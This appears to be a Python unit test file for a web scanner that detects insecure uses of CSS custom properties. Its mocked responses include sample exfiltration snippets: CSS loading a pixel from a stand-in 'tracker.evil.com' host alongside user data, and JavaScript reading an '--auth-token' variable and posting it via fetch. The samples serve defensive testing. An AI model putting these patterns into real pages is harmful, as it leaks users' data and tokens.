"""Tests for CSSCustomPropertiesSecurityScanner."""
from unittest.mock import MagicMock
from tblue.scanner.css_custom_properties_security import CSSCustomPropertiesSecurityScanner


def _scanner():
    s = CSSCustomPropertiesSecurityScanner.__new__(CSSCustomPropertiesSecurityScanner)
    s.http = MagicMock()
    return s


def _resp(text, status=200):
    r = MagicMock()
    r.status_code = status
    r.text = text
    r.headers = {}
    return r


def test_css_var_value_from_url_param():
    s = _scanner()
    s.http.get.return_value = _resp(
        "document.body.style.setProperty('--primary-color', searchParams.get('color'))"
    )
    results = s.scan("http://example.com")
    types = [r["type"] for r in results]
    assert "css_var_value_from_url_param" in types


def test_css_var_exfil_via_url():
    s = _scanner()
    s.http.get.return_value = _resp(
        ".track {\n"
        "  background: var(--user-data) url('https://tracker.evil.com/pixel.gif')\n"
        "}"
    )
    results = s.scan("http://example.com")
    types = [r["type"] for r in results]
    assert "css_var_exfil_via_url" in types


def test_css_var_sensitive_value_exfiltrated():
    s = _scanner()
    s.http.get.return_value = _resp(
        "const tok = getComputedStyle(el).getPropertyValue('--auth-token')\n"
        "fetch('/log', {body: tok})"
    )
    results = s.scan("http://example.com")
    types = [r["type"] for r in results]
    assert "css_var_sensitive_value_exfiltrated" in types


def test_css_custom_properties_not_used():
    s = _scanner()
    s.http.get.return_value = _resp("<html>No CSS variables</html>")
    results = s.scan("http://example.com")
    assert results[0]["type"] == "css_custom_properties_not_used"
    assert results[0]["status"] == "PASS"


def test_css_custom_properties_null_response():
    s = _scanner()
    s.http.get.return_value = None
    results = s.scan("http://example.com")
    assert results[0]["type"] == "css_custom_properties_not_used"
